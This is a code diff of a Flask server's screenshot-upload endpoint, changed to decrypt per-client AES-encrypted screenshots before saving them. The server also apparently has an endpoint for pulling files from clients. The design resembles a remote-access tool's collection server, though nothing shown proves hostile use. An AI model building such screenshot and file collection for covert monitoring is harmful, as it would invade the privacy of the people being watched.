@@ -496,17 +496,33 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 @app.route("/api/screenshot", methods=["POST"])
 def save_screenshot():
-    if "file" not in request.files:
-        return "No file uploaded", 400
 
-    file = request.files["file"]
-    if file.filename == "":
-        return "No file selected", 400
 
-    # Get client_id from form data
-    client_id = request.form.get("client_id")
+
+
+
+    client_id = request.form.get('client_id')
     if not client_id:
-        return "client_id is required", 400
+        return jsonify({"error": "client_id is required"}), 400
+
+    # Get the uploaded file
+    if 'file' not in request.files:
+        return jsonify({"error": "No file part in request"}), 400
+    
+    file = request.files['file']
+    if file.filename == '':
+        return jsonify({"error": "No selected file"}), 400
+
+    # Read the encrypted data (JSON bytes)
+    encrypted_bytes = file.read()
+    encrypted_data = json.loads(encrypted_bytes.decode('utf-8'))
+
+    # Extract nonce, ciphertext, tag
+    nonce_hex = encrypted_data['nonce']
+    ciphertext_hex = encrypted_data['ciphertext']
+    tag_hex = encrypted_data['tag']
+    
+    decrypted_bytes = decrypt_data(get_aes_key_by_client_id(client_id), nonce_hex, ciphertext_hex, tag_hex)
 
     # Generate a timestamp
     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")  # Format: YYYYMMDD_HHMMSS
@@ -515,10 +531,17 @@ def save_screenshot():
     filename = f"{client_id}-{timestamp}.png"
     file_path = os.path.join(UPLOAD_FOLDER, filename)
 
-    # Save the file
-    file.save(file_path)
-
-    return f"Screenshot saved as {filename}", 200
+    if decrypted_bytes:
+        with open(file_path, 'wb') as f:
+            f.write(decrypted_bytes)
+        print(f"Decrypted screenshot saved to {file_path}")
+        return jsonify({
+            "status": "success"
+        }), 200
+    else:
+        return jsonify({
+            "status": "failed"
+        }), 400
 
 @app.route('/api/download-files-from-client', methods=['POST'])
 def upload_file():
